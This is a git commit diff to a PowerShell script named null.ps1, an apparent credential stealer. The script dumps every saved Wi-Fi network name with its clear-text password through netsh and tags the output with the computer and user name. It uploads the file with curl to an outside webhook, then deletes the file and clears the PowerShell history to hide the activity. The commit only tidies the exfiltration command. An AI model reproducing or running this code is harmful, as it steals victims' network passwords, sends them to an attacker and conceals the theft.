b61a33aee07a89c8c7ea14e3e739cc83765fe94e
deathesther <122229257+Esther7171@users.noreply.github.com>
2026-06-19 12:59:18 +0530

    Update null.ps1

--- scripts/null.ps1
+++ scripts/null.ps1
@@ -5,14 +5,12 @@ netsh wlan show profiles|Select-String 'All User Profile'|%{
     $n=($_ -split ':')[1].Trim()
     $p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content')
     if($p){"$n : "+(($p -split ':')[1].Trim())}
-}|Out-File $f -Encoding UTF8 -NoClobber:$false
+}|Out-File $f -Encoding UTF8
 
 $h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME`n"+(Get-Content $f -Raw)
 $h|Out-File $f -Encoding UTF8
 
-curl.exe -s -X POST $wh `
-  -F "payload_json={`"content`":`"**[r00t_b0t]** ``$env:COMPUTERNAME`` | ``$env:USERNAME``**"}" `
-  -F "file1=@$f;type=text/plain"
+curl.exe -s -X POST $wh -F "payload_json={""content"":""[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME""}" -F "file1=@$f;type=text/plain"
 
 Remove-Item $f -Force -ErrorAction SilentlyContinue
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
